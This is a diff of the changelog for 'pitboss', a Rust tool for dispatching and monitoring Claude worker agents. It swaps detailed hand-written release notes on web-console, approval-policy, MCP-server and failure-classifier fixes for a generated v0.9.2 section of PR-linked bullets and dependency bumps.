@@ -6,3402 +6,455 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 This project uses [Semantic Versioning](https://semver.org/).
 
 CHANGELOG entries from v0.9.2 onward are generated from commit messages
-by [`git-cliff`](https://git-cliff.org/) at release time. **Do not
-hand-edit this file in feature PRs** — your PR title (the squash-merge
-commit subject) IS the changelog line. See `RELEASE.md` for the release
-flow and `cliff.toml` for the format. The `[Unreleased]` section below
-is the last hand-curated section and will roll into v0.9.2.
+by `git-cliff` at release time. Hand-editing this file in feature PRs
+is no longer required (or recommended — it causes merge conflicts).
+See #242 for the adoption notes.
 
-## [Unreleased]
+## [0.9.2] — 2026-04-30
 
-### Added
+The container subsystem grows up. Operators iterating against
+`pitboss container-dispatch` get a real toolchain story:
+declare apt packages and host files in the manifest, bake them
+into a derived image once with `pitboss container-build`, and let
+`container-dispatch` pick up the cached tag automatically. Stale
+derived images sweep with `pitboss container-prune`. The published
+`pitboss-with-claude` image now rolls forward on every main merge
+(rolling `:main` and `:main-<sha>` tags) instead of stagnating
+between releases. Plus the usual smaller polish — auto-refresh on
+the runs list and run-detail pages, persisted per-task cost on
+`TaskRecord`, an SSE event-stream filter on the run-detail page,
+and a graceful shutdown contract for `pitboss-web stop`.
 
-- **Per-task and run-total cost estimates on the run-detail page.**
-  TaskRecord doesn't carry a `cost_usd` field — neither the dispatcher
-  nor the budget reconciliation path persists per-task cost. Rather
-  than schema-bumping, the SPA now computes cost client-side via a new
-  `$lib/prices.ts` helper that mirrors `pitboss_core::prices` (3-line
-  price table keyed on the `opus`/`sonnet`/`haiku` family substring).
-  The "Runtime" card briefly introduced by #238 moves into the
-  meta-header line; "Cost (est.)" reclaims the fourth card slot, and
-  the per-row Cost column comes back to the Tasks tab alongside the
-  Tokens column. When at least one task's model isn't in the price
-  table the run-total returns null (rendered as "—") rather than a
-  partial-but-misleading dollar figure.
+Highlights:
 
-### Changed
-
-- **`manifest_name` in `summary.json` falls back to the manifest filename
-  stem when `[run].name` is omitted** (#227). Pre-fix, `manifest_name`
-  was set directly from `resolved.name` in both finalize paths;
-  manifests without an explicit `[run].name` landed `null` in the
-  finalized summary, which in turn split the UI: the runs list
-  synthesized `<unnamed>`, the insights aggregator independently
-  re-derived from the manifest filename, and the run-detail card
-  (`GET /api/runs/{id}`) showed `null`. Three different surfaces would
-  show three different names for the same run.
-
-  **Fix:** new `dispatch::summary::resolve_manifest_display_name`
-  helper that prefers the declared name, falls back to the filename
-  stem, and trims whitespace either way. Both `runner.rs::finalize_run`
-  and `hierarchical.rs`'s finalize phase route through it so all
-  surfaces agree. Pinned by 6 unit tests covering the declared/empty/
-  filename/no-stem/no-extension/whitespace cases.
-
-- **Aborted runs in the runs list are dimmed (italic + 60% opacity)**
-  (#229). Pre-fix, an aborted run with `tasks_total: 0` was visually
-  indistinguishable from a completed run except for the small status
-  pill, making the list noisy when scanning. Both the flat and the
-  manifest-grouped views in `routes/+page.svelte` now apply
-  `opacity-60 italic` to rows where `status === 'aborted'`. Default
-  visible (no filter), so the operator still sees them — they just
-  don't compete visually with completed runs.
-
-### Fixed
-
-- **`WorkersSnapshot` now produces correct `parent_task_id` and keeps
-  every actor visible after sub-leads exit.** Two long-standing bugs
-  in `crates/pitboss-cli/src/control/server.rs::collect_layer_workers`
-  that the SPA's #238 patch papered over but the wire format still got
-  wrong (TUI / future consumers saw the same garbage):
-
-  - Every entry from a sub-lead's layer was tagged with
-    `parent_task_id = sublead_id`, *including* the sub-lead's own
-    row that `run_kill_resume_loop` inserts into `layer.workers`.
-    The sub-lead became its own parent on the wire. Fix: pass the
-    layer's `lead_id` and a separate `lead_parent` arg into
-    `collect_layer_workers`; entries whose id matches the layer's
-    own `lead_id` use `lead_parent` (root lead's id for sub-leads,
-    `None` for root), everything else parents to `layer.lead_id`.
-    Side-effect: root-spawned workers now correctly report
-    `parent_task_id = root_lead_id` instead of `None`, matching
-    what `spawn.rs` writes into their `TaskRecord`.
-
-  - `dispatch/sublead.rs::reconcile_terminated_sublead` removed the
-    sub-lead from `state.subleads` and let the `LayerState` drop, so
-    a `ListWorkers` taken late in a run with short-lived sub-trees
-    silently lost both the sub-lead row and every sub-tree worker —
-    the operator was left looking at just the root lead. Fix: new
-    `state.terminated_sublead_layers: RwLock<Vec<Arc<LayerState>>>`
-    that the reconcile path pushes into; `ListWorkers` now iterates
-    `subleads` ∪ `terminated_sublead_layers` (deduped by `lead_id`).
-
-  Pinned by 2 new tests in `control::server::tests`:
-  `list_workers_sublead_self_row_parents_to_root_lead` and
-  `list_workers_includes_terminated_subleads`. The existing
-  `list_workers_aggregates_root_and_sublead_workers` was asserting
-  the broken behavior (`root_entry.parent_task_id.is_none()`);
-  updated to assert `Some("lead")` to match the corrected wire.
-
-- **Run-detail Tokens card and Workers panel now show real data
-  (and the broken Cost card is gone).** Three data-flow bugs that all
-  surfaced together once the polling fix landed:
-
-  - **Tokens always 0**: the SPA summed `usage.input_tokens` /
-    `output_tokens`, but TaskRecord uses `usage.input` / `output` —
-    so the field never resolved. Also read from `taskList`
-    (populated only post-finalize) instead of `tasksToRender`,
-    which means even after the fix it wouldn't update during a
-    live run. Both fixed; the Tokens card now ticks up as actors
-    finish.
-
-  - **Cost card always $0.00**: read a `cost_usd` field that has
-    never existed on TaskRecord — there is no per-task cost data
-    anywhere in the run artifacts. Replaced the card with
-    "Runtime", which we DO have data for (live-ticking elapsed
-    time during the run, frozen `total_duration_ms` after).
-    Per-row Cost column in the Tasks tab replaced with Tokens.
-
-  - **Workers panel goes empty after subleads exit**: the
-    dispatcher's `WorkersSnapshot` only includes actors in active
-    layers. When a sublead terminates, `state.subleads.remove()`
-    fires, and the entire sub-tree (sublead + sub-tree workers)
-    disappears from the snapshot. Late in a run with short-lived
-    sub-trees, the operator was left looking at just the root lead.
-    Plus a related dispatcher bug: a sublead's own snapshot entry
-    has `parent_task_id = self.id` (because `collect_layer_workers`
-    tags every entry with the sublead_id arg, including the
-    sublead's own row).
-
-    Fixed in the SPA by union-ing the live `WorkersSnapshot` with
-    entries synthesized from `summary.jsonl` for any task_id not
-    in the live list. summary.jsonl is append-only and carries
-    every actor this run has ever spawned with the correct
-    `parent_task_id`. Live rows whose `parent_task_id == task_id`
-    get patched to `undefined` so the sublead nests at root level
-    instead of under itself.
-
-- **Run-detail view now updates task counts, costs, tokens, and worker
-  list while a run is in progress.** Pre-fix, the page fetched
-  `summary.jsonl` once at mount and never re-read it, so the per-task
-  metrics derived from it (count, cost, token totals, durations, failure
-  reasons) froze at whatever happened to be on disk when the operator
-  navigated to the page. The Workers card had a related but separate
-  bug: the dispatcher emits `WorkersSnapshot` only in response to a
-  `list_workers` op, never proactively, and the SPA never sent that op
-  — so the panel sat at "Waiting for first snapshot…" for the entire
-  run.
-
-  **Fix:** added a 3 s polling effect on the run-detail page that
-  re-fetches `summary.jsonl` and POSTs `list_workers` while the run is
-  in-progress. Also fires `list_workers` once on initial SSE connect
-  so the first paint has worker tiles instead of a placeholder. Tears
-  down as soon as `inProgress` flips false (run finalized — page swaps
-  to the static `summary.json` view), so completed runs don't burn
-  cycles.
+- **`[container].extra_apt` + `[[container.copy]]`** — declare
+  apt packages and host-file copies in the manifest. Two paths:
+  install at dispatch start (slow) or `pitboss container-build` to
+  bake into a derived image and amortize across runs.
+- **`pitboss container-build` + `pitboss container-prune`** —
+  deterministic SHA-tagged derived images with idempotent re-runs,
+  and a sweeper for the stale tags that accumulate as manifests
+  evolve.
+- **Image-cadence fix (#258)** — `:main`, `:main-<sha>`, and
+  `:latest` now roll forward on every main merge, ending the
+  "0.9.1 is two days old, my fix is in main, why isn't it in the
+  image" mode that bit operators twice in the post-0.9.1 window.
+- **Cost telemetry** — per-task `cost_usd` now persists on
+  `TaskRecord` at finalize time and the run-detail page renders
+  per-task and run-total cost estimates client-side.
 
 ### Added
 
-- **`pitboss-web stop` subcommand** for graceful shutdown of the web
-  console. The `serve` path now writes a PID file at
-  `$XDG_RUNTIME_DIR/pitboss/pitboss-web.pid` (falls back to
-  `dirs::cache_dir()` then `/tmp`); `stop` reads it, sends SIGTERM,
-  and polls until the process exits (default 10s timeout, override
-  with `--timeout-secs`). The serve path also installs a graceful-
-  shutdown future so SIGTERM / Ctrl-C drain in-flight requests
-  before returning.
+- Pitboss container-prune for stale derived images ([#270](https://github.com/SDS-Mode/pitboss/pull/270))
+- Warn when extra_apt-only manifest's derived image is missing ([#269](https://github.com/SDS-Mode/pitboss/pull/269))
+- Pitboss container-build subcommand + [[container.copy]] ([#264](https://github.com/SDS-Mode/pitboss/pull/264))
+- Bootstrap apt packages via [container].extra_apt ([#263](https://github.com/SDS-Mode/pitboss/pull/263))
+- Persist per-task cost_usd on TaskRecord at finalize time ([#245](https://github.com/SDS-Mode/pitboss/pull/245))
+- Per-task and run-total cost estimates on run-detail page ([#240](https://github.com/SDS-Mode/pitboss/pull/240))
+- SSE event-stream filter UI on run-detail page ([#236](https://github.com/SDS-Mode/pitboss/pull/236))
+- Pitboss-web stop subcommand + graceful shutdown ([#235](https://github.com/SDS-Mode/pitboss/pull/235))
+- GET /api/runs/{id}/tasks/{task_id} task-metadata endpoint ([#233](https://github.com/SDS-Mode/pitboss/pull/233))
+- Async McpServer::shutdown with deterministic per-connection cleanup (#151 M2) ([#216](https://github.com/SDS-Mode/pitboss/pull/216))
+- SessionStore::iter_runs metadata-only enumeration (#149 L8) ([#213](https://github.com/SDS-Mode/pitboss/pull/213))
+- SessionHandle builder overrides + resume-failure hint (#149, #184) ([#202](https://github.com/SDS-Mode/pitboss/pull/202))
 
-  Backward-compatible CLI: `pitboss-web --port 7077 …` still works
-  without the explicit `serve` subcommand. New `pitboss-web serve`
-  is an alias for callers that prefer explicit subcommands.
-
-  Side benefits: a second `pitboss-web` against a live PID file is
-  rejected with a friendly `pitboss-web already running with pid …`
-  error instead of port-bind racing; stale PID files (process gone
-  but file remained) are auto-cleaned on next start. Pinned by 5
-  unit tests in `pidfile::tests` covering self-PID liveness,
-  garbage-PID handling, and the EPERM-classifies-as-alive branch.
-
-- **SSE event-stream filter UI on the run-detail page.** A new "Filters"
-  button next to the Event stream card title opens a panel with two
-  controls: a "Hide noise" switch (default on) that suppresses
-  `store_activity` events with empty `counters` arrays — the
-  dispatcher heartbeats those even when no shared-store ops are
-  happening, and they were burying signal events in the operator's
-  view — and a per-event-kind toggle row built from the kinds the
-  operator has actually seen this session. Choices persist to
-  `localStorage` (`pitboss-sse-filters-v1`) so refreshes don't reset
-  filter state. Stored as `disabledKinds` rather than `enabledKinds`
-  so future event kinds added by the dispatcher default to visible —
-  the operator opts out when a kind gets noisy. Card description now
-  shows `<visible> of <total> events · <hidden> hidden` to make the
-  filter effect explicit.
-
-- **`GET /api/runs/{run_id}/tasks/{task_id}` — single-task metadata
-  endpoint** (#225). Returns the full `TaskRecord` JSON for one actor
-  by reading `summary.jsonl` line-by-line, so leads / sub-leads / sub-tree
-  workers are all directly addressable. Pre-fix, the SPA's per-task
-  page had to load the entire run summary just to render one row, and
-  hierarchical-run sub-tree records were unreachable because
-  `summary.json`'s `tasks[]` only carried the root layer (#221). The
-  per-task SPA page now fetches metadata and log in parallel
-  (`Promise.allSettled`); a 404 on metadata is non-fatal so the page
-  still renders the log for older runs that pre-date the endpoint.
-
-### Fixed
-
-- **Approval counters now bump for every resolution path, not just
-  operator responses** (#224). Pre-fix, `worker_counters.approvals_approved`
-  / `approvals_rejected` were only bumped inside `ApprovalBridge::respond`
-  and the operator-driven path in `control/server.rs`. Every other
-  resolution path — `default_approval_policy = auto_approve` /
-  `auto_reject` short-circuits, `[[approval_policy]]` rule
-  `auto_approve` / `auto_reject` short-circuits in
-  `mcp/tools/approval.rs::handle_request_approval` and
-  `handle_propose_plan`, TTL fallbacks fired by
-  `runner.rs::install_approval_ttl_watcher` (both queue and bridge
-  scans), and the queue-full safe-rejection path in
-  `ApprovalBridge::request` — synthesized the response inline without
-  touching the counters. After PR #220 made `auto_approve`
-  short-circuit unconditionally, every smoke run exhibited the
-  resulting off-by-one (1 requested, 0 approved/rejected) on the
-  lead's `TaskRecord`. The matcher-rule paths additionally never
-  bumped `approvals_requested` either, so policy-resolved approvals
-  showed `(0, 0, 0)` end-to-end.
-
-  **Fix:** lifted counter bookkeeping into two helpers in
-  `mcp/approval.rs` — `bump_approval_requested` and
-  `record_approval_outcome` — and called them from every resolution
-  path. The existing `respond()` and `control/server.rs` paths were
-  refactored to use the helper. Pinned by 4 new tests in
-  `mcp::approval::tests` (`auto_approve_bumps_requested_and_approved`,
-  `auto_reject_bumps_requested_and_rejected`,
-  `queue_full_safe_rejection_bumps_requested_and_rejected`,
-  `respond_path_bumps_approved`).
-
-- **Failures dashboard now shows the agent's actual error message
-  instead of mid-JSON garbage** (#222, #223). `failure_classify::excerpt`
-  used to take the trailing 240 characters of the log blob via
-  `chars().skip(...).collect()`. Stream-JSON emits one event per line,
-  so "last 240 chars" landed mid-event almost every time, producing
-  output like `put_tokens":0,"ephemeral_5m_input_tokens":0},...`. That
-  rendered in the failures dashboard's `error_message` column as
-  unreadable JSON shrapnel and made it impossible to cluster on
-  templated errors. The same code path also accounted for the entire
-  symptom of #223 ("successful workers being classified as failures"):
-  the workers in question had genuinely exited code 1 — claude had
-  emitted a `result` event with `terminal_reason: "completed"` and a
-  human-readable error string ("There's an issue with the selected
-  model …"), but the wrapper still exited non-zero. The garbled excerpt
-  hid that signal and made the dashboard look like it was inventing
-  failures.
-
-  **Fix:** rewrote `excerpt()` as a three-tier extractor (line-aware →
-  JSON-aware → char-cap floor). It walks bottom-up to the last non-empty
-  line; if that line parses as JSON it pulls (in order) `error.message`,
-  `result.error.message`, then `result.result` (claude SDK puts the
-  agent's final answer / human-readable error there); falling back to
-  the line itself capped at `EXCERPT_MAX_CHARS` codepoints. Pinned by
-  6 new tests in `failure_classify::tests` covering the SDK envelope
-  extraction, the priority order, malformed-JSON fallthrough, and
-  empty-string skip. The pre-existing `excerpt_caps_length` and
-  `no_marker_returns_unknown_with_excerpt` tests still pass — char cap
-  semantics preserved.
-
-- **Hierarchical run finalize: `summary.json` now includes every actor
-  across all layers** (#221). Pre-fix, `dispatch/hierarchical.rs`'s
-  finalize phase built `summary.json`'s `tasks` array by walking
-  `state.root.workers` only — sub-tree workers live in their sub-lead's
-  `LayerState.workers`, not root, so a 5-actor smoke run (lead + 2
-  sub-leads + 2 workers) produced `tasks_total: 1` and a `tasks` array
-  with only the lead. Every operational console surface — runs index,
-  run detail page, insights/runs digest, insights dashboard rollups —
-  saw "1 task, 0 failed" for a hierarchical run that had 5 actors. Same
-  bug class as #146 (mutating handlers had to scan all layers via
-  `find_worker_across_layers` / `layer_for_worker`; finalize was
-  missed).
-
-  **Fix:** read `summary.jsonl` as the source of truth for the actor
-  list. `summary.jsonl` is appended to incrementally by every actor at
-  exit time — the lead's record is appended at line ~400 of finalize;
-  every sub-lead's record is appended by `dispatch/sublead.rs` at
-  sub-lead exit; every Done worker's record is appended by
-  `mcp/tools/spawn.rs::run_worker`. Reading the JSONL captures every
-  layer for free. The synthesise-Cancelled-for-in-flight-workers loop
-  now walks root + every sub-lead's `LayerState.workers` (was: root
-  only) and skips any task_id already present in the JSONL to avoid
-  clobbering a Done record that landed in a tight race window.
-
-  Extracted `read_summary_jsonl_records` as a private helper, pinned
-  by 4 new regression tests:
-  - `read_summary_jsonl_aggregates_lead_subleads_and_workers` —
-    asserts a 5-line JSONL parses into 5 `TaskRecord`s in append
-    order, with all task_ids present in the returned id-set.
-  - `read_summary_jsonl_skips_unparseable_lines` — mid-write
-    truncation lines and empty lines don't break aggregation.
-  - `read_summary_jsonl_empty_file_returns_empty` — finalize on an
-    empty JSONL is non-fatal.
-  - `read_summary_jsonl_missing_file_errors` — finalize callers
-    always have the file because the lead's record was appended a
-    few hundred lines above; a missing file is a real error.
-
-  Cascade impact (also fixed by this PR):
-  - Run detail page now shows full hierarchy.
-  - Insights dashboard `tasks_total` / `tasks_failed` rollup is
-    correct (#226 closes transitively).
-  - The new `GET /api/runs/{id}/tasks/{task_id}` endpoint (#225)
-    has accurate data to read from now.
-
-### Changed (breaking, pre-v1)
-
-- **`default_approval_policy = "auto_approve"` / `"auto_reject"` is
-  now unconditional** — pre-fix it only fired when no TUI/web console
-  was attached. A connected console silently bypassed the policy and
-  routed every `request_approval` / `propose_plan` call to the
-  operator anyway. That made the field mean two different things
-  depending on whether someone happened to be watching, which was the
-  worst kind of bug class. Reported via the smoke-test post-run
-  zero-error scan: every sublead's auto-approved propose_plan call
-  popped up in the web console for manual click.
-
-  **New semantics:**
-  - `auto_approve` — short-circuits inside the dispatcher, regardless
-    of whether a TUI is attached. Operator UI is never paged.
-  - `auto_reject` — same, with rejection. Comment text is now
-    `"auto-rejected by default_approval_policy"` (was
-    `"no operator available"` on the no-TUI path).
-  - `block` (default) — unchanged: route to TUI if attached, else
-    queue for next connect.
-
-  **Migration:** operators who relied on the old "auto_approve only
-  when headless" behavior should leave `default_approval_policy` at
-  the default `block` and add an `[[approval_policy]]` rule like
-  `match.actor = "*"` / `action = "auto_approve"` to express the
-  fallback declaratively. (`[[approval_policy]]` rules already
-  short-circuit before the TUI hop, so this gives the same headless
-  behavior without the surprise when a console connects.)
-
-  Pinned by 2 new regression tests
-  (`auto_approve_short_circuits_with_tui_attached`,
-  `auto_reject_short_circuits_with_tui_attached`) that simulate a
-  connected control writer and verify no `ApprovalRequest` event is
-  ever sent. Schema field doc on `default_approval_policy` and the
-  module-level rustdoc on `mcp::approval` updated to spell out the
-  three resolution paths in order.
 
 ### Changed
 
-- **Failure classifier: schema-first matching against Anthropic API
-  error envelopes** (#185 medium). Pre-fix
-  `pitboss_core::failure_classify::classify` walked the worker's
-  log blob with `str::contains()` substring matchers
-  (`"rate_limit_exceeded"`, `"authentication_error"`,
-  `"invalid_request_error"`, etc.) — brittle to incidental string
-  formatting changes from the upstream Claude CLI. Now a two-stage
-  matcher: stage 1 walks the blob line-by-line, attempts to parse
-  each line as a stream-JSON event, and looks for the public
-  Anthropic API error envelope shape (`{"error":{"type":…,
-  "message":…}}`, optionally nested under `result` for SDK
-  streaming responses); recognized `error.type` strings
-  (`rate_limit_exceeded`, `overloaded_error`,
-  `authentication_error`, `invalid_request_error`) map directly
-  to `FailureReason`. The API error-type contract is far more
-  stable than scanning prose, so when present these are
-  authoritative. Stage 2 keeps the existing substring matchers
-  unchanged for non-JSON content (CLI banners like `"You've hit
-  your limit · resets Apr 23, 3pm"` and shell-level errors like
-  `getaddrinfo ENOTFOUND`). The "auth wins over rate-limit when
-  both markers coexist" priority rule applies at both stages.
-  `InvalidArgument` excerpts now carry the API-supplied
-  `error.message` directly when available, more useful than the
-  whole-blob excerpt the substring path produced. Pinned by 8 new
-  regression tests covering the `result.error` envelope, the
-  `overloaded_error` alias, in-message `resets …` timestamp
-  extraction, mixed-stdout interleaving, the auth-banner override
-  of a rate-limit JSON event, the `prompt is too long`
-  ContextExceeded disambiguation, unknown-error-type fallthrough,
-  and the CLI-banner-only path. All 21 pre-existing classifier
-  tests still pass.
+- **Image-cadence fix (#258, [#265](https://github.com/SDS-Mode/pitboss/pull/265))** — `:main`, `:main-<sha>`, and `:latest` on `ghcr.io/sds-mode/pitboss-with-claude` now roll forward on every main merge, not only on release-tag pushes. **Behavior change**: `:latest` strictly tracks main HEAD now, not the most recent release tag. To pin a release, use a version tag (`:0.9.1`, `:0.9`, `:0`); for fixes-since-release use `:main` or `:latest`. Reproducibility: `:main-<short-sha>` is the SHA-pinned alternative.
+- Schema-first matching against API error envelopes (#185 medium) ([#219](https://github.com/SDS-Mode/pitboss/pull/219))
+- Split tools.rs into per-feature submodules (#151 L6) ([#218](https://github.com/SDS-Mode/pitboss/pull/218))
+- SqliteStore migration version table (#149 L11) ([#212](https://github.com/SDS-Mode/pitboss/pull/212))
+- O(1) sub-tree-worker routing in cancel_actor_with_reason ([#205](https://github.com/SDS-Mode/pitboss/pull/205))
+- Consolidate entry-point boilerplate (#150 M9) ([#204](https://github.com/SDS-Mode/pitboss/pull/204))
+- Decompose runner::execute into per-phase functions ([#203](https://github.com/SDS-Mode/pitboss/pull/203))
+- Extract kill+resume loop helper ([#201](https://github.com/SDS-Mode/pitboss/pull/201))
+- Collapse cancel-cascade watcher tasks; close #100 (PR 100.3) ([#200](https://github.com/SDS-Mode/pitboss/pull/200))
+- Centralize cancel-cascade through CancelToken::cascade_to (#100, PR 100.2) ([#199](https://github.com/SDS-Mode/pitboss/pull/199))
+
+
+### Dependencies
+
+- Bump rmcp from 0.8.5 to 1.5.0 ([#176](https://github.com/SDS-Mode/pitboss/pull/176))
+- Bump rusqlite from 0.32.1 to 0.39.0 ([#177](https://github.com/SDS-Mode/pitboss/pull/177))
+- Bump lru from 0.12.5 to 0.16.4 ([#178](https://github.com/SDS-Mode/pitboss/pull/178))
+- Bump ratatui from 0.29.0 to 0.30.0 ([#180](https://github.com/SDS-Mode/pitboss/pull/180))
+- Bump the rust-minor-and-patch group across 1 directory with 2 updates ([#173](https://github.com/SDS-Mode/pitboss/pull/173))
+
 
 ### Fixed
 
-- **MCP policy: `cost_over` rules now fire for `propose_plan` and
-  `permission_prompt`** (#151 M5). Pre-fix both call sites
-  hard-coded `cost = None` when invoking the policy matcher, so
-  any operator-declared `cost_over = X → action` rule silently
-  never matched for plan-level approvals or per-tool permission
-  gates — only `request_approval` (which already had a
-  `cost_estimate` field) could trigger them. Now: `ProposePlanArgs`
-  and `PermissionPromptArgs` each carry an optional
-  `cost_estimate: Option<f64>` field that the gating side can
-  populate (e.g. plan total or tool-input-derived heuristic), and
-  both `handle_propose_plan` and `handle_permission_prompt` thread
-  it into the matcher. Callers that omit it fall through to `None`
-  matching exactly as before — backward-compatible by default.
-  Updated the policy.rs comment to reflect the new coverage and
-  retain the future-work note (server-side cost estimation that
-  emits `ApprovalCategory::Cost` approvals so rules fire without
-  caller hints). Three new tests:
-  `propose_plan_cost_over_rule_auto_rejects_when_estimate_exceeds`,
-  `propose_plan_cost_over_rule_does_not_fire_below_threshold`,
-  `permission_prompt_cost_over_rule_denies_when_estimate_exceeds`.
+- Auto-refresh runs list, re-fetch run record in detail tick ([#247](https://github.com/SDS-Mode/pitboss/pull/247))
+- Manifest_name fallback + dim aborted rows (#227, #229) ([#234](https://github.com/SDS-Mode/pitboss/pull/234))
+- Line- and JSON-aware excerpt for failures dashboard (#222, #223) ([#232](https://github.com/SDS-Mode/pitboss/pull/232))
+- Correct parent_task_id + retain terminated subleads in WorkersSnapshot ([#239](https://github.com/SDS-Mode/pitboss/pull/239))
+- Tokens / workers / runtime cards on run-detail page ([#238](https://github.com/SDS-Mode/pitboss/pull/238))
+- Poll summary.jsonl + list_workers while run is in-progress ([#237](https://github.com/SDS-Mode/pitboss/pull/237))
+- Bump approval counters from every resolution path ([#231](https://github.com/SDS-Mode/pitboss/pull/231))
+- Summary.json now includes every actor across all layers ([#230](https://github.com/SDS-Mode/pitboss/pull/230))
+- Default_approval_policy now unconditional, regardless of TUI ([#220](https://github.com/SDS-Mode/pitboss/pull/220))
+- Cost_over rules now fire for propose_plan + permission_prompt (#151 M5) ([#217](https://github.com/SDS-Mode/pitboss/pull/217))
+- Half-close socket write half on c2s EOF (#151 L1) ([#214](https://github.com/SDS-Mode/pitboss/pull/214))
+- Return retained Worktree from cleanup (#149 L9) ([#211](https://github.com/SDS-Mode/pitboss/pull/211))
+- Async git-diff summary on detail-view open (#154 M3) ([#210](https://github.com/SDS-Mode/pitboss/pull/210))
+- Join workers with timeout instead of fixed sleep on hierarchical drain (#150 M6+M7) ([#209](https://github.com/SDS-Mode/pitboss/pull/209))
+- Drop dead viewport constant + cancel old bridge-forwarder on SwitchRun ([#207](https://github.com/SDS-Mode/pitboss/pull/207))
+- Don't strand approvals when no control client is attached (#154 L2) ([#208](https://github.com/SDS-Mode/pitboss/pull/208))
+- Write journal line before bumping failed_emits_total ([#198](https://github.com/SDS-Mode/pitboss/pull/198))
+- Emit warn! when rate-limit reset_at parse fails ([#194](https://github.com/SDS-Mode/pitboss/pull/194))
+- Consolidate depth-2 invariant enforcement + web socket-path resolution ([#192](https://github.com/SDS-Mode/pitboss/pull/192))
+- Typed schema-version + alias regression test for resolved.json snapshots ([#191](https://github.com/SDS-Mode/pitboss/pull/191))
+- Crash-safe atomic writes for summary.json and meta.json (#184, #188) ([#190](https://github.com/SDS-Mode/pitboss/pull/190))
 
-### Added
-
-- **`McpServer::shutdown` — async, deterministic teardown** (#151 M2).
-  Pre-fix the only teardown path was synchronous `Drop`, which
-  fires the `CancellationToken` and aborts the accept loop's join
-  handle but cannot `await tracker.wait()` — so per-connection
-  cleanup tasks (`release_all_for_actor` for held leases, identity
-  slot drain) were detached at drop time and raced against the
-  dispatcher's exit. Harmless in production today (the run is
-  exiting anyway), but observable as flaky test teardowns and as
-  leases that look "still held" to a follow-up reader for a few
-  millis after the run finishes. Now: an `async fn shutdown(self)`
-  signals the accept loop, fires the cancel token, closes the
-  tracker, **awaits `tracker.wait()`** so per-connection cleanup
-  finishes, then awaits the join handle and removes the socket
-  file. `Drop` stays as a fallback for non-async drop sites and is
-  a no-op tail after `shutdown` consumes the same fields. The
-  hierarchical dispatcher (`run_hierarchical`) now ends with
-  `mcp.shutdown().await` before returning. Pinned by a regression
-  test (`server_shutdown_completes_promptly_with_active_connection`)
-  that opens a raw connection to keep the tracker non-empty,
-  awaits shutdown, and asserts both the prompt return (proves the
-  cancel token unblocks the per-connection `select!`) and that
-  the socket file is removed.
-
-### Changed
-
-- **`mcp::tools` split into per-feature submodules** (#151 L6, pure
-  refactor — no behavior change). The single `mcp/tools.rs` had
-  grown to 4301 lines covering tool arg structs, handlers, budget
-  logic, spawn/cancel/approval/wait paths, and tests in one
-  module — well past reviewable size. Now split into
-  `crates/pitboss-cli/src/mcp/tools/`:
-  - `spawn.rs` — `handle_spawn_worker`, `spawn_resume_worker`,
-    `worker_spawn_args`, the budget reservation helpers,
-    `initial_estimate_for`, `PITBOSS_WORKER_MCP_TOOLS`.
-  - `lifecycle.rs` — `handle_list_workers`, `handle_worker_status`,
-    `handle_cancel_worker`, `handle_pause_worker`,
-    `handle_continue_worker`, `handle_reprompt_worker`.
-  - `approval.rs` — `handle_request_approval`, `handle_propose_plan`,
-    `handle_permission_prompt`, the `PermissionPromptArgs` /
-    `PermissionPromptResponse` types.
-  - `wait.rs` — `handle_wait_for_worker`, `handle_wait_for_actor`,
-    `handle_wait_for_any` (sharing the internal
-    `wait_for_actor_internal` engine).
-  - `tests.rs` — all 50+ unit tests, kept in one file so the
-    shared `test_state` / `completing_test_state` /
-    `mk_plan_state` / `register_test_sublead` / `index_worker`
-    builders aren't duplicated across submodules.
-  `tools.rs` itself is now the parent module: arg/result struct
-  definitions (used as the public surface by `mcp::server`) and
-  the cross-module helpers `find_worker_across_layers` /
-  `layer_for_worker`. External callers continue to use
-  `crate::mcp::tools::*` — `pub use` re-exports preserve every
-  previously-public handler and type.
-
-### Documentation
-
-- **MCP module: rustdoc cleanup for `McpServer` + sparse tool
-  descriptions** (#151 L4 + L5).
-  - L4: added a top-level rustdoc block on `McpServer` enumerating
-    its actual public surface (`start`, `socket_path`, `Drop`) so
-    future audit / extraction tools no longer hallucinate
-    `McpServer::new` / `McpServer::shutdown` (which never existed).
-    `socket_path()` also got its own rustdoc explaining the
-    lifetime contract (the file is removed on `Drop`).
-  - L5: expanded the descriptions Claude sees for `spawn_worker`,
-    `worker_status`, and `request_approval` so each carries
-    explicit when-to-use guidance, the call's cost (blocking
-    semantics, side effects, budget impact), and the alternative
-    tool to reach for instead. Brings them up to the level of
-    `cancel_worker` / `pause_worker` / `propose_plan` which were
-    already detailed.
-
-### Fixed
-
-- **MCP bridge: half-close socket write half on c2s EOF** (#151 L1).
-  Pre-fix, the bare `tokio::select!` in `run_bridge` exited the
-  instant either direction completed — when c2s won (claude closed
-  stdin), the s2c future was dropped mid-write, taking with it any
-  in-flight server→client bytes that had been read off the socket
-  but not yet copied to stdout. Worse, the unix-socket write half
-  was not explicitly shut down, so the server kept its read half
-  open until the bridge process exited; under load this left
-  half-closed sockets and contributed to test flakiness when the
-  bridge restarted mid-test. Now: c2s explicitly calls
-  `AsyncWriteExt::shutdown()` on the socket write half before
-  returning, and the c2s arm of the `select!` awaits s2c with a
-  bounded 5s timeout (`S2C_DRAIN_TIMEOUT`) to drain the remaining
-  server→client bytes to stdout. Pinned by a new regression test
-  `bridge_drains_in_flight_s2c_when_c2s_eofs_first` that drives an
-  IO-generic `run_bridge_io` against a real `UnixStream` pair: a
-  server response is pre-loaded onto the socket, the test's stdin
-  is closed immediately, and the test asserts the response reaches
-  stdout *and* the server side observes EOF on its read half.
-
-### Added
-
-- **`SessionStore::iter_runs`** (#149 L8). New trait method that
-  enumerates runs as `RunMeta` records, newest-first by `started_at`,
-  without ever materialising per-run task lists. Pre-fix the trait
-  exposed only `load_run`, so the only path to a run inventory was to
-  walk the runs directory out-of-band (via
-  `pitboss_cli::runs::collect_run_entries`) or call `load_run` per
-  run-id and pay for the full task-list parse on every entry.
-  Implementations land in both backends: `JsonFileStore` walks the
-  root and parses `meta.json` per subdir (skipping unreadable / missing
-  / malformed entries silently); `SqliteStore` issues a single
-  `SELECT … FROM runs ORDER BY started_at DESC` and never touches
-  `task_records`. Tests cover empty inventory, newest-first ordering,
-  and (for `JsonFileStore`) skipping subdirs without `meta.json`.
-
-### Changed
-
-- **`WorktreeManager::cleanup` now returns `Option<Worktree>`** (#149 L9).
-  Previously the method consumed `Worktree` by value and returned
-  `Result<(), WorktreeError>`, so callers using `CleanupPolicy::Never`
-  (or `OnSuccess` with `succeeded == false`) lost the path after the
